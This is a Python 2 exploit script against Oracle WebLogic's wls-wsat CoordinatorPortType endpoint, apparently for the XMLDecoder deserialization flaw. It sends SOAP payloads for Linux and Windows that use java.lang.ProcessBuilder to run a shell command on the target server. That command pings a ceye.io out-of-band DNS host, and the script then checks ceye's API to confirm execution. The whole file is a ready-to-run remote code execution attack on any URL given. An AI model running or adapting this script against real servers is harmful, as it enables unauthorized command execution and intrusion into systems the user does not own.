
#coding=utf8
import sys
import requests
import random
from string import letters


class Exploit:

    def __init__(self, url):
        self.url = url if not url.endswith('/') else url.strip('/')
        self.API = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
        self.domain = 'xxxxxx.ceye.io'
        self.BANNER = ''.join([random.choice(letters) for i in range(6)])
        self.API_URL = 'http://api.ceye.io/v1/records?token={}&type=dns&filter={}'.format(self.API, self.BANNER)

    def run(self):
        self.post(self.get_linux_payload())
        self.post(self.get_windows_payload())

    def post(self, data):
        headers = {
            "Content-Type": "text/xml;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/wls-wsat/CoordinatorPortType"

        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=data, headers=headers, timeout=10, verify=False)
        except Exception:
            print "[-] Connection Error"

        if self.confirm_sucess():
                print "[!] %s is vuln" % vulnurl
                sys.exit(0)

    def get_windows_payload(self):
        windows_post_data = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java>
                <object class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3">
                    <void index="0">
                      <string>cmd</string>
                    </void>
                    <void index="1">
                      <string>/c</string>
                    </void>
                    <void index="2">
                      <string>ping {}.{}</string>
                    </void>
                  </array>
                  <void method="start"/>
                </object>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>
        '''
        return windows_post_data.format(self.BANNER, self.domain)

    def get_linux_payload(self):
        linux_post_data = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java>
                <object class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3">
                    <void index="0">
                      <string>/bin/sh</string>
                    </void>
                    <void index="1">
                      <string>-c</string>
                    </void>
                    <void index="2">
                      <string>ping {}.{}</string>
                    </void>
                  </array>
                  <void method="start"/>
                </object>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>
        '''
        return linux_post_data.format(self.BANNER, self.domain)

    def confirm_sucess(self):
        req = requests.get(self.API_URL)
        d = req.json()
        try:
            name = d['data'][0]['name']
            # print self.BANNER
            # print name
            if self.BANNER in name:
                return True
        except Exception:
            return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print 'Usage: python %s url' % sys.argv[0]
        sys.exit(0)

    exploit = Exploit(sys.argv[1])
    exploit.run()
